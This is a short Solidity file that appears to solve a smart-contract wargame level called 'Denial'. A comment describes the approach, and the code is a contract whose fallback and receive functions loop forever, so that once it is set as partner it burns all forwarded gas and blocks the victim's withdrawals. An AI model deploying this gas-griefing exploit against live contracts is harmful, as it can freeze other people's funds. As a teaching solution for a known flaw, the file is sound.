// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* Solution:
// Make a contract that runs infinite loop and add it to the Denial contract as partner.
// This loop will run until all gas is consumed hence reverting the tx.
*/

contract MyContract {

    function deposit() public pure {
        while (true) {}
    }

    fallback() external payable {deposit();}
    receive() external payable {deposit();}
}
